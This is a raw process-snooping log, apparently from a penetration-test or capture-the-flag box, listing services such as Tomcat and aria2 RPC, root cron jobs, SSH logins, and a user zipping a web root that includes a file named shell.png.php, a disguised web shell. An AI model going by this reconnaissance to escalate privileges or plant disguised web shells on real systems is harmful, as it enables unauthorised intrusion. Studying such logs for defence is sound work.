+2025/01/16 12:19:13 [33;1mCMD: UID=1002  PID=562    | /usr/lib/jvm/java-1.11.0-openjdk-amd64/bin/java -Djava.util.logging.config.file=/opt/tomcat/conf/logging.properties -Djava.util.logging.manager=org.apache.juli.ClassLoaderLogManager -Djava.security.egd=file:///dev/urandom -Djava.awt.headless=true -Djdk.tls.ephemeralDHKeySize=2048 -Djava.protocol.handler.pkgs=org.apache.catalina.webresources -Dorg.apache.catalina.security.SecurityListener.UMASK=0027 -Xms512M -Xmx1024M -server -XX:+UseParallelGC -Dignore.endorsed.dirs= -classpath /opt/tomcat/bin/bootstrap.jar:/opt/tomcat/bin/tomcat-juli.jar -Dcatalina.base=/opt/tomcat -Dcatalina.home=/opt/tomcat -Djava.io.tmpdir=/opt/tomcat/temp org.apache.catalina.startup.Bootstrap start [0m
+2025/01/16 12:19:13 [34;1mCMD: UID=0     PID=547    | /usr/sbin/ModemManager [0m
+2025/01/16 12:19:13 [34;1mCMD: UID=0     PID=544    | sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups [0m
+2025/01/16 12:19:13 [35;1mCMD: UID=1     PID=519    | /usr/sbin/atd -f [0m
+2025/01/16 12:19:13 [34;1mCMD: UID=0     PID=509    | /usr/lib/udisks2/udisksd [0m
+2025/01/16 12:19:13 [34;1mCMD: UID=0     PID=503    | /lib/systemd/systemd-logind [0m
+2025/01/16 12:19:13 [35;1mCMD: UID=104   PID=495    | /usr/sbin/rsyslogd -n -iNONE [0m
+2025/01/16 12:19:13 [34;1mCMD: UID=0     PID=491    | /usr/lib/policykit-1/polkitd --no-debug [0m
+2025/01/16 12:19:13 [34;1mCMD: UID=0     PID=490    | /usr/sbin/cron -f [0m
+2025/01/16 12:19:13 [33;1mCMD: UID=1002  PID=481    | /usr/bin/node /opt/aria2/node-server.js [0m
+2025/01/16 12:19:13 [34;1mCMD: UID=0     PID=480    | /usr/bin/python3 /usr/bin/networkd-dispatcher --run-startup-triggers [0m
+2025/01/16 12:19:13 [34;1mCMD: UID=103   PID=470    | /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only [0m
+2025/01/16 12:19:13 [33;1mCMD: UID=1002  PID=468    | /usr/bin/aria2c --enable-rpc --rpc-listen-all [0m
+2025/01/16 12:19:13 [34;1mCMD: UID=0     PID=467    | /usr/bin/amazon-ssm-agent [0m
+2025/01/16 12:19:13 [34;1mCMD: UID=0     PID=466    | /usr/lib/accountsservice/accounts-daemon [0m
+2025/01/16 12:19:13 [36;1mCMD: UID=101   PID=463    | /lib/systemd/systemd-resolved [0m
+2025/01/16 12:19:13 [31;1mCMD: UID=100   PID=460    | /lib/systemd/systemd-networkd [0m
+2025/01/16 12:19:13 [34;1mCMD: UID=0     PID=423    | /sbin/multipathd -d -s [0m
+2025/01/16 12:19:13 [34;1mCMD: UID=0     PID=422    | [0m
+2025/01/16 12:19:13 [34;1mCMD: UID=0     PID=421    | [0m
+2025/01/16 12:19:13 [34;1mCMD: UID=0     PID=420    | [0m
+2025/01/16 12:19:13 [34;1mCMD: UID=0     PID=419    | [0m
+2025/01/16 12:19:13 [34;1mCMD: UID=0     PID=358    | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:19:13 [34;1mCMD: UID=0     PID=325    | /lib/systemd/systemd-journald [0m
+2025/01/16 12:19:13 [34;1mCMD: UID=0     PID=257    | [0m
+2025/01/16 12:19:13 [34;1mCMD: UID=0     PID=256    | [0m
+2025/01/16 12:19:13 [34;1mCMD: UID=0     PID=216    | [0m
+2025/01/16 12:19:13 [34;1mCMD: UID=0     PID=156    | [0m
+2025/01/16 12:19:13 [34;1mCMD: UID=0     PID=122    | [0m
+2025/01/16 12:19:13 [34;1mCMD: UID=0     PID=109    | [0m
+2025/01/16 12:19:13 [34;1mCMD: UID=0     PID=108    | [0m
+2025/01/16 12:19:13 [34;1mCMD: UID=0     PID=105    | [0m
+2025/01/16 12:19:13 [34;1mCMD: UID=0     PID=96     | [0m
+2025/01/16 12:19:13 [34;1mCMD: UID=0     PID=95     | [0m
+2025/01/16 12:19:13 [34;1mCMD: UID=0     PID=93     | [0m
+2025/01/16 12:19:13 [34;1mCMD: UID=0     PID=92     | [0m
+2025/01/16 12:19:13 [34;1mCMD: UID=0     PID=91     | [0m
+2025/01/16 12:19:13 [34;1mCMD: UID=0     PID=90     | [0m
+2025/01/16 12:19:13 [34;1mCMD: UID=0     PID=89     | [0m
+2025/01/16 12:19:13 [34;1mCMD: UID=0     PID=88     | [0m
+2025/01/16 12:19:13 [34;1mCMD: UID=0     PID=87     | [0m
+2025/01/16 12:19:13 [34;1mCMD: UID=0     PID=86     | [0m
+2025/01/16 12:19:13 [34;1mCMD: UID=0     PID=84     | [0m
+2025/01/16 12:19:13 [34;1mCMD: UID=0     PID=83     | [0m
+2025/01/16 12:19:13 [34;1mCMD: UID=0     PID=79     | [0m
+2025/01/16 12:19:13 [34;1mCMD: UID=0     PID=78     | [0m
+2025/01/16 12:19:13 [34;1mCMD: UID=0     PID=77     | [0m
+2025/01/16 12:19:13 [34;1mCMD: UID=0     PID=76     | [0m
+2025/01/16 12:19:13 [34;1mCMD: UID=0     PID=75     | [0m
+2025/01/16 12:19:13 [34;1mCMD: UID=0     PID=74     | [0m
+2025/01/16 12:19:13 [34;1mCMD: UID=0     PID=73     | [0m
+2025/01/16 12:19:13 [34;1mCMD: UID=0     PID=72     | [0m
+2025/01/16 12:19:13 [34;1mCMD: UID=0     PID=71     | [0m
+2025/01/16 12:19:13 [34;1mCMD: UID=0     PID=70     | [0m
+2025/01/16 12:19:13 [34;1mCMD: UID=0     PID=24     | [0m
+2025/01/16 12:19:13 [34;1mCMD: UID=0     PID=23     | [0m
+2025/01/16 12:19:13 [34;1mCMD: UID=0     PID=22     | [0m
+2025/01/16 12:19:13 [34;1mCMD: UID=0     PID=21     | [0m
+2025/01/16 12:19:13 [34;1mCMD: UID=0     PID=20     | [0m
+2025/01/16 12:19:13 [34;1mCMD: UID=0     PID=19     | [0m
+2025/01/16 12:19:13 [34;1mCMD: UID=0     PID=18     | [0m
+2025/01/16 12:19:13 [34;1mCMD: UID=0     PID=17     | [0m
+2025/01/16 12:19:13 [34;1mCMD: UID=0     PID=16     | [0m
+2025/01/16 12:19:13 [34;1mCMD: UID=0     PID=15     | [0m
+2025/01/16 12:19:13 [34;1mCMD: UID=0     PID=14     | [0m
+2025/01/16 12:19:13 [34;1mCMD: UID=0     PID=12     | [0m
+2025/01/16 12:19:13 [34;1mCMD: UID=0     PID=11     | [0m
+2025/01/16 12:19:13 [34;1mCMD: UID=0     PID=10     | [0m
+2025/01/16 12:19:13 [34;1mCMD: UID=0     PID=9      | [0m
+2025/01/16 12:19:13 [34;1mCMD: UID=0     PID=8      | [0m
+2025/01/16 12:19:13 [34;1mCMD: UID=0     PID=6      | [0m
+2025/01/16 12:19:13 [34;1mCMD: UID=0     PID=4      | [0m
+2025/01/16 12:19:13 [34;1mCMD: UID=0     PID=3      | [0m
+2025/01/16 12:19:13 [34;1mCMD: UID=0     PID=2      | [0m
+2025/01/16 12:19:13 [34;1mCMD: UID=0     PID=1      | /sbin/init [0m
+2025/01/16 12:19:14 [34;1mCMD: UID=0     PID=12428  | /lib/systemd/systemd --user [0m
+2025/01/16 12:19:15 [34;1mCMD: UID=0     PID=12429  | [0m
+2025/01/16 12:19:15 [34;1mCMD: UID=0     PID=12430  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new [0m
+2025/01/16 12:19:15 [34;1mCMD: UID=0     PID=12431  | /bin/sh /etc/update-motd.d/00-header [0m
+2025/01/16 12:19:15 [34;1mCMD: UID=0     PID=12432  | /bin/sh /etc/update-motd.d/00-header [0m
+2025/01/16 12:19:15 [34;1mCMD: UID=0     PID=12433  | uname -r [0m
+2025/01/16 12:19:15 [34;1mCMD: UID=0     PID=12434  | [0m
+2025/01/16 12:19:15 [34;1mCMD: UID=0     PID=12435  | run-parts --lsbsysinit /etc/update-motd.d [0m
+2025/01/16 12:19:15 [34;1mCMD: UID=0     PID=12436  | run-parts --lsbsysinit /etc/update-motd.d [0m
+2025/01/16 12:19:15 [34;1mCMD: UID=0     PID=12437  | /bin/sh /etc/update-motd.d/50-landscape-sysinfo [0m
+2025/01/16 12:19:15 [36;1mCMD: UID=???   PID=12440  | ???[0m
+2025/01/16 12:19:15 [36;1mCMD: UID=???   PID=12439  | ???[0m
+2025/01/16 12:19:15 [36;1mCMD: UID=???   PID=12438  | ???[0m
+2025/01/16 12:19:15 [34;1mCMD: UID=0     PID=12442  | run-parts --lsbsysinit /etc/update-motd.d [0m
+2025/01/16 12:19:15 [34;1mCMD: UID=0     PID=12446  | /bin/sh /etc/update-motd.d/50-motd-news [0m
+2025/01/16 12:19:15 [34;1mCMD: UID=0     PID=12445  | /bin/sh /etc/update-motd.d/50-motd-news [0m
+2025/01/16 12:19:15 [34;1mCMD: UID=0     PID=12444  | /bin/sh /etc/update-motd.d/50-motd-news [0m
+2025/01/16 12:19:15 [34;1mCMD: UID=0     PID=12443  | /bin/sh /etc/update-motd.d/50-motd-news [0m
+2025/01/16 12:19:15 [34;1mCMD: UID=0     PID=12447  | [0m
+2025/01/16 12:19:15 [34;1mCMD: UID=0     PID=12449  | cat /var/lib/update-notifier/updates-available [0m
+2025/01/16 12:19:15 [34;1mCMD: UID=0     PID=12448  | /bin/sh /etc/update-motd.d/90-updates-available [0m
+2025/01/16 12:19:16 [34;1mCMD: UID=0     PID=12451  | grep -q -m 1 . [0m
+2025/01/16 12:19:16 [34;1mCMD: UID=0     PID=12450  | /bin/sh /etc/update-motd.d/90-updates-available [0m
+2025/01/16 12:19:16 [34;1mCMD: UID=0     PID=12452  | /bin/sh /etc/update-motd.d/90-updates-available [0m
+2025/01/16 12:19:16 [34;1mCMD: UID=0     PID=12453  | /bin/sh /usr/share/update-notifier/notify-updates-outdated [0m
+2025/01/16 12:19:16 [34;1mCMD: UID=0     PID=12454  | gettext To check for new updates run: sudo apt update [0m
+2025/01/16 12:19:16 [34;1mCMD: UID=0     PID=12455  | run-parts --lsbsysinit /etc/update-motd.d [0m
+2025/01/16 12:19:16 [34;1mCMD: UID=0     PID=12456  | /bin/sh /etc/update-motd.d/91-release-upgrade [0m
+2025/01/16 12:19:16 [34;1mCMD: UID=0     PID=12459  | /bin/sh /etc/update-motd.d/91-release-upgrade [0m
+2025/01/16 12:19:16 [34;1mCMD: UID=0     PID=12458  | /bin/sh /etc/update-motd.d/91-release-upgrade [0m
+2025/01/16 12:19:16 [34;1mCMD: UID=0     PID=12457  | /bin/sh /etc/update-motd.d/91-release-upgrade [0m
+2025/01/16 12:19:18 [34;1mCMD: UID=0     PID=12462  | /bin/sh -e /usr/lib/ubuntu-release-upgrader/release-upgrade-motd [0m
+2025/01/16 12:19:18 [34;1mCMD: UID=0     PID=12463  | /bin/sh -e /usr/lib/ubuntu-release-upgrader/release-upgrade-motd [0m
+2025/01/16 12:19:18 [34;1mCMD: UID=0     PID=12464  | /bin/sh -e /usr/lib/ubuntu-release-upgrader/release-upgrade-motd [0m
+2025/01/16 12:19:18 [34;1mCMD: UID=0     PID=12465  | cat /var/lib/ubuntu-release-upgrader/release-upgrade-available [0m
+2025/01/16 12:19:18 [34;1mCMD: UID=0     PID=12466  | run-parts --lsbsysinit /etc/update-motd.d [0m
+2025/01/16 12:19:18 [34;1mCMD: UID=0     PID=12467  | /bin/sh /etc/update-motd.d/95-hwe-eol [0m
+2025/01/16 12:19:18 [34;1mCMD: UID=0     PID=12468  | /bin/sh -e /usr/lib/update-notifier/update-motd-hwe-eol [0m
+2025/01/16 12:19:18 [34;1mCMD: UID=0     PID=12469  | /bin/sh -e /usr/lib/update-notifier/update-motd-hwe-eol [0m
+2025/01/16 12:19:19 [34;1mCMD: UID=0     PID=12470  | apt-config shell StateDir Dir::State [0m
+2025/01/16 12:19:19 [34;1mCMD: UID=0     PID=12471  | apt-config shell ListDir Dir::State::Lists [0m
+2025/01/16 12:19:19 [34;1mCMD: UID=0     PID=12472  | apt-config shell ListDir Dir::State::Lists [0m
+2025/01/16 12:19:19 [34;1mCMD: UID=0     PID=12473  | apt-config shell DpkgStatus Dir::State::status [0m
+2025/01/16 12:19:19 [36;1mCMD: UID=???   PID=12474  | ???[0m
+2025/01/16 12:19:19 [34;1mCMD: UID=0     PID=12476  | /usr/bin/dpkg --print-foreign-architectures [0m
+2025/01/16 12:19:19 [34;1mCMD: UID=0     PID=12475  | apt-config shell EtcDir Dir::Etc [0m
+2025/01/16 12:19:19 [34;1mCMD: UID=0     PID=12478  | /usr/bin/dpkg --print-foreign-architectures [0m
+2025/01/16 12:19:19 [34;1mCMD: UID=0     PID=12477  | apt-config shell SourceList Dir::Etc::sourcelist [0m
+2025/01/16 12:19:19 [34;1mCMD: UID=0     PID=12479  | find /var/lib/apt/lists/ /etc/apt/sources.list //var/lib/dpkg/status -type f -newer /var/lib/update-notifier/hwe-eol -print -quit [0m
+2025/01/16 12:19:19 [34;1mCMD: UID=0     PID=12481  | /bin/sh -e /usr/lib/update-notifier/update-motd-hwe-eol [0m
+2025/01/16 12:19:19 [34;1mCMD: UID=0     PID=12482  | /bin/sh -e /usr/lib/update-notifier/update-motd-hwe-eol [0m
+2025/01/16 12:19:19 [34;1mCMD: UID=0     PID=12483  | cat /var/lib/update-notifier/hwe-eol [0m
+2025/01/16 12:19:20 [34;1mCMD: UID=0     PID=12484  | /bin/sh -e /usr/lib/update-notifier/update-motd-hwe-eol [0m
+2025/01/16 12:19:20 [34;1mCMD: UID=0     PID=12485  | run-parts --lsbsysinit /etc/update-motd.d [0m
+2025/01/16 12:19:20 [34;1mCMD: UID=0     PID=12488  | /bin/sh /etc/update-motd.d/97-overlayroot [0m
+2025/01/16 12:19:20 [34;1mCMD: UID=0     PID=12487  | /bin/sh /etc/update-motd.d/97-overlayroot [0m
+2025/01/16 12:19:20 [34;1mCMD: UID=0     PID=12486  | /bin/sh /etc/update-motd.d/97-overlayroot [0m
+2025/01/16 12:19:20 [34;1mCMD: UID=0     PID=12493  | /bin/sh /usr/lib/update-notifier/update-motd-fsck-at-reboot [0m
+2025/01/16 12:19:20 [34;1mCMD: UID=0     PID=12492  | /bin/sh /usr/lib/update-notifier/update-motd-fsck-at-reboot [0m
+2025/01/16 12:19:20 [34;1mCMD: UID=0     PID=12489  | /bin/sh /usr/lib/update-notifier/update-motd-fsck-at-reboot [0m
+2025/01/16 12:19:20 [34;1mCMD: UID=0     PID=12494  | [0m
+2025/01/16 12:19:20 [34;1mCMD: UID=0     PID=12495  | /bin/sh /usr/lib/update-notifier/update-motd-fsck-at-reboot [0m
+2025/01/16 12:19:20 [34;1mCMD: UID=0     PID=12497  | sshd: root@pts/2     [0m
+2025/01/16 12:19:21 [34;1mCMD: UID=0     PID=12498  | -bash [0m
+2025/01/16 12:19:21 [34;1mCMD: UID=0     PID=12499  | -bash [0m
+2025/01/16 12:19:21 [34;1mCMD: UID=0     PID=12501  | -bash [0m
+2025/01/16 12:19:21 [34;1mCMD: UID=0     PID=12500  | -bash [0m
+2025/01/16 12:19:21 [34;1mCMD: UID=0     PID=12502  | -bash [0m
+2025/01/16 12:19:21 [34;1mCMD: UID=0     PID=12503  | /bin/sh /usr/bin/lesspipe [0m
+2025/01/16 12:19:21 [34;1mCMD: UID=0     PID=12504  | /bin/sh /usr/bin/lesspipe [0m
+2025/01/16 12:19:21 [34;1mCMD: UID=0     PID=12505  | dirname /usr/bin/lesspipe [0m
+2025/01/16 12:19:21 [34;1mCMD: UID=0     PID=12506  | dircolors -b [0m
+2025/01/16 12:19:21 [34;1mCMD: UID=0     PID=12507  | -bash [0m
+2025/01/16 12:19:22 [34;1mCMD: UID=0     PID=12508  | su - orville [0m
+2025/01/16 12:19:22 [32;1mCMD: UID=1003  PID=12509  | -bash [0m
+2025/01/16 12:19:22 [32;1mCMD: UID=1003  PID=12510  | -bash [0m
+2025/01/16 12:19:22 [32;1mCMD: UID=1003  PID=12514  | /bin/sh /usr/bin/lesspipe [0m
+2025/01/16 12:19:22 [32;1mCMD: UID=1003  PID=12515  | [0m
+2025/01/16 12:19:22 [32;1mCMD: UID=1003  PID=12517  | dirname /usr/bin/lesspipe [0m
+2025/01/16 12:19:22 [32;1mCMD: UID=1003  PID=12516  | /bin/sh /usr/bin/lesspipe [0m
+2025/01/16 12:19:23 [32;1mCMD: UID=1003  PID=12518  | dircolors -b [0m
+2025/01/16 12:19:23 [32;1mCMD: UID=1003  PID=12519  | -bash [0m
+2025/01/16 12:19:28 [32;1mCMD: UID=1003  PID=12520  | -bash [0m
+2025/01/16 12:19:35 [34;1mCMD: UID=0     PID=12521  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:19:36 [34;1mCMD: UID=0     PID=12530  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:19:36 [34;1mCMD: UID=0     PID=12529  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:19:36 [34;1mCMD: UID=0     PID=12528  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:19:36 [34;1mCMD: UID=0     PID=12527  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:19:36 [34;1mCMD: UID=0     PID=12526  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:19:36 [34;1mCMD: UID=0     PID=12525  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:19:36 [34;1mCMD: UID=0     PID=12524  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:19:36 [34;1mCMD: UID=0     PID=12523  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:19:36 [34;1mCMD: UID=0     PID=12522  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:19:46 [34;1mCMD: UID=0     PID=12541  | /sbin/init [0m
+2025/01/16 12:19:46 [34;1mCMD: UID=0     PID=12540  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:19:46 [34;1mCMD: UID=0     PID=12539  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:19:46 [34;1mCMD: UID=0     PID=12538  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:19:46 [34;1mCMD: UID=0     PID=12537  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:19:46 [34;1mCMD: UID=0     PID=12536  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:19:46 [34;1mCMD: UID=0     PID=12535  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:19:46 [34;1mCMD: UID=0     PID=12534  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:19:46 [34;1mCMD: UID=0     PID=12533  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:19:46 [34;1mCMD: UID=0     PID=12532  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:19:46 [34;1mCMD: UID=0     PID=12531  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:20:01 [34;1mCMD: UID=0     PID=12542  | /usr/sbin/CRON -f [0m
+2025/01/16 12:20:01 [34;1mCMD: UID=0     PID=12544  | systemctl restart manage [0m
+2025/01/16 12:20:01 [34;1mCMD: UID=0     PID=12543  | /bin/sh -c systemctl restart manage [0m
+2025/01/16 12:20:01 [34;1mCMD: UID=0     PID=12545  | /sbin/init [0m
+2025/01/16 12:20:01 [34;1mCMD: UID=0     PID=12555  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:20:01 [34;1mCMD: UID=0     PID=12554  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:20:01 [34;1mCMD: UID=0     PID=12553  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:20:01 [34;1mCMD: UID=0     PID=12552  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:20:01 [34;1mCMD: UID=0     PID=12551  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:20:01 [34;1mCMD: UID=0     PID=12550  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:20:01 [34;1mCMD: UID=0     PID=12549  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:20:01 [34;1mCMD: UID=0     PID=12548  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:20:01 [34;1mCMD: UID=0     PID=12547  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:20:01 [34;1mCMD: UID=0     PID=12546  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:20:06 [34;1mCMD: UID=0     PID=12556  | /usr/sbin/sshd -D -R [0m
+2025/01/16 12:20:06 [34;1mCMD: UID=109   PID=12558  | sshd: [net]          [0m
+2025/01/16 12:20:07 [34;1mCMD: UID=0     PID=12560  | /lib/systemd/systemd-user-runtime-dir start 0 [0m
+2025/01/16 12:20:08 [34;1mCMD: UID=0     PID=12561  | (systemd) [0m
+2025/01/16 12:20:08 [34;1mCMD: UID=0     PID=12562  | (sd-pam) [0m
+2025/01/16 12:20:08 [34;1mCMD: UID=0     PID=12564  | /usr/lib/systemd/user-environment-generators/30-systemd-environment-d-generator [0m
+2025/01/16 12:20:08 [34;1mCMD: UID=0     PID=12563  | (sd-executor) [0m
+2025/01/16 12:20:10 [34;1mCMD: UID=0     PID=12566  | /bin/systemctl --user set-environment DBUS_SESSION_BUS_ADDRESS=unix:path=/run/user/0/bus [0m
+2025/01/16 12:20:10 [34;1mCMD: UID=0     PID=12568  | /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d [0m
+2025/01/16 12:20:10 [34;1mCMD: UID=0     PID=12567  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new [0m
+2025/01/16 12:20:10 [34;1mCMD: UID=0     PID=12569  | /bin/sh /etc/update-motd.d/00-header [0m
+2025/01/16 12:20:10 [34;1mCMD: UID=0     PID=12570  | [0m
+2025/01/16 12:20:10 [34;1mCMD: UID=0     PID=12571  | /bin/sh /etc/update-motd.d/00-header [0m
+2025/01/16 12:20:10 [34;1mCMD: UID=0     PID=12579  | cut -f1 -d   /proc/loadavg [0m
+2025/01/16 12:20:10 [34;1mCMD: UID=0     PID=12578  | bc [0m
+2025/01/16 12:20:10 [34;1mCMD: UID=0     PID=12577  | /bin/sh /etc/update-motd.d/50-landscape-sysinfo [0m
+2025/01/16 12:20:10 [34;1mCMD: UID=0     PID=12576  | /bin/sh /etc/update-motd.d/50-landscape-sysinfo [0m
+2025/01/16 12:20:10 [34;1mCMD: UID=0     PID=12574  | /bin/sh /etc/update-motd.d/50-landscape-sysinfo [0m
+2025/01/16 12:20:10 [34;1mCMD: UID=0     PID=12584  | cut -c -80 [0m
+2025/01/16 12:20:10 [34;1mCMD: UID=0     PID=12583  | /bin/sh /etc/update-motd.d/50-motd-news [0m
+2025/01/16 12:20:10 [34;1mCMD: UID=0     PID=12582  | /bin/sh /etc/update-motd.d/50-motd-news [0m
+2025/01/16 12:20:10 [34;1mCMD: UID=0     PID=12581  | /bin/sh /etc/update-motd.d/50-motd-news [0m
+2025/01/16 12:20:10 [34;1mCMD: UID=0     PID=12580  | /bin/sh /etc/update-motd.d/50-motd-news [0m
+2025/01/16 12:20:11 [34;1mCMD: UID=0     PID=12585  | [0m
+2025/01/16 12:20:11 [34;1mCMD: UID=0     PID=12587  | cat /var/lib/update-notifier/updates-available [0m
+2025/01/16 12:20:11 [34;1mCMD: UID=0     PID=12586  | /bin/sh /etc/update-motd.d/90-updates-available [0m
+2025/01/16 12:20:11 [34;1mCMD: UID=0     PID=12589  | grep -q -m 1 . [0m
+2025/01/16 12:20:11 [34;1mCMD: UID=0     PID=12588  | /bin/sh /etc/update-motd.d/90-updates-available [0m
+2025/01/16 12:20:11 [34;1mCMD: UID=0     PID=12595  | /bin/sh /etc/update-motd.d/91-release-upgrade [0m
+2025/01/16 12:20:11 [34;1mCMD: UID=0     PID=12594  | /bin/sh /etc/update-motd.d/91-release-upgrade [0m
+2025/01/16 12:20:11 [34;1mCMD: UID=0     PID=12597  | /bin/sh /etc/update-motd.d/91-release-upgrade [0m
+2025/01/16 12:20:11 [34;1mCMD: UID=0     PID=12596  | /bin/sh /etc/update-motd.d/91-release-upgrade [0m
+2025/01/16 12:20:12 [34;1mCMD: UID=0     PID=12598  | /bin/sh /etc/update-motd.d/91-release-upgrade [0m
+2025/01/16 12:20:12 [34;1mCMD: UID=0     PID=12604  | /bin/sh -e /usr/lib/update-notifier/update-motd-hwe-eol [0m
+2025/01/16 12:20:12 [34;1mCMD: UID=0     PID=12605  | /bin/sh -e /usr/lib/update-notifier/update-motd-hwe-eol [0m
+2025/01/16 12:20:13 [34;1mCMD: UID=0     PID=12607  | apt-config shell StateDir Dir::State [0m
+2025/01/16 12:20:13 [34;1mCMD: UID=0     PID=12606  | apt-config shell StateDir Dir::State [0m
+2025/01/16 12:20:13 [34;1mCMD: UID=0     PID=12610  | apt-config shell DpkgStatus Dir::State::status [0m
+2025/01/16 12:20:13 [34;1mCMD: UID=0     PID=12611  | apt-config shell DpkgStatus Dir::State::status [0m
+2025/01/16 12:20:13 [34;1mCMD: UID=0     PID=12612  | apt-config shell EtcDir Dir::Etc [0m
+2025/01/16 12:20:13 [34;1mCMD: UID=0     PID=12614  | apt-config shell SourceList Dir::Etc::sourcelist [0m
+2025/01/16 12:20:13 [34;1mCMD: UID=0     PID=12621  | [0m
+2025/01/16 12:20:13 [34;1mCMD: UID=0     PID=12625  | sort -r [0m
+2025/01/16 12:20:13 [34;1mCMD: UID=0     PID=12624  | /bin/sh /etc/update-motd.d/97-overlayroot [0m
+2025/01/16 12:20:13 [34;1mCMD: UID=0     PID=12623  | /bin/sh /etc/update-motd.d/97-overlayroot [0m
+2025/01/16 12:20:13 [34;1mCMD: UID=0     PID=12622  | /bin/sh /etc/update-motd.d/97-overlayroot [0m
+2025/01/16 12:20:13 [34;1mCMD: UID=0     PID=12628  | stat -c %Y /var/lib/update-notifier/fsck-at-reboot [0m
+2025/01/16 12:20:13 [34;1mCMD: UID=0     PID=12626  | /bin/sh /usr/lib/update-notifier/update-motd-fsck-at-reboot [0m
+2025/01/16 12:20:13 [34;1mCMD: UID=0     PID=12630  | awk {print $1} /proc/uptime [0m
+2025/01/16 12:20:13 [34;1mCMD: UID=0     PID=12629  | /bin/sh /usr/lib/update-notifier/update-motd-fsck-at-reboot [0m
+2025/01/16 12:20:13 [34;1mCMD: UID=0     PID=12631  | [0m
+2025/01/16 12:20:14 [34;1mCMD: UID=0     PID=12634  | sshd: root@pts/2     [0m
+2025/01/16 12:20:14 [34;1mCMD: UID=0     PID=12635  | -bash [0m
+2025/01/16 12:20:14 [34;1mCMD: UID=0     PID=12639  | -bash [0m
+2025/01/16 12:20:14 [34;1mCMD: UID=0     PID=12644  | -bash [0m
+2025/01/16 12:20:14 [34;1mCMD: UID=0     PID=12645  | su - orville [0m
+2025/01/16 12:20:15 [32;1mCMD: UID=1003  PID=12646  | -bash [0m
+2025/01/16 12:20:15 [32;1mCMD: UID=1003  PID=12647  | -bash [0m
+2025/01/16 12:20:15 [32;1mCMD: UID=1003  PID=12648  | [0m
+2025/01/16 12:20:15 [32;1mCMD: UID=1003  PID=12651  | -bash [0m
+2025/01/16 12:20:15 [32;1mCMD: UID=1003  PID=12655  | dircolors -b [0m
+2025/01/16 12:20:17 [32;1mCMD: UID=1003  PID=12656  | zip -q -r /home/orville/web_snapshot.zip /var/www/html/css /var/www/html/dashboard.php /var/www/html/includes /var/www/html/index.php /var/www/html/login.php /var/www/html/logout.php /var/www/html/navbar.php /var/www/html/register.php /var/www/html/shell.png.php /var/www/html/uploads [0m
+2025/01/16 12:20:22 [32;1mCMD: UID=1003  PID=12657  | [0m
+2025/01/16 12:20:29 [34;1mCMD: UID=0     PID=12658  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:20:29 [34;1mCMD: UID=0     PID=12666  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:20:29 [34;1mCMD: UID=0     PID=12665  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:20:29 [34;1mCMD: UID=0     PID=12664  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:20:29 [34;1mCMD: UID=0     PID=12663  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:20:29 [34;1mCMD: UID=0     PID=12662  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:20:29 [34;1mCMD: UID=0     PID=12661  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:20:29 [34;1mCMD: UID=0     PID=12660  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:20:29 [34;1mCMD: UID=0     PID=12659  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:20:29 [34;1mCMD: UID=0     PID=12667  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:20:29 [34;1mCMD: UID=0     PID=12668  | [0m
+2025/01/16 12:20:29 [34;1mCMD: UID=0     PID=12669  | [0m
+2025/01/16 12:20:39 [34;1mCMD: UID=0     PID=12670  | [0m
+2025/01/16 12:20:39 [34;1mCMD: UID=0     PID=12680  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:20:39 [34;1mCMD: UID=0     PID=12679  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:20:39 [34;1mCMD: UID=0     PID=12678  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:20:39 [34;1mCMD: UID=0     PID=12677  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:20:39 [34;1mCMD: UID=0     PID=12676  | /lib/systemd/systemd-udevd [0m
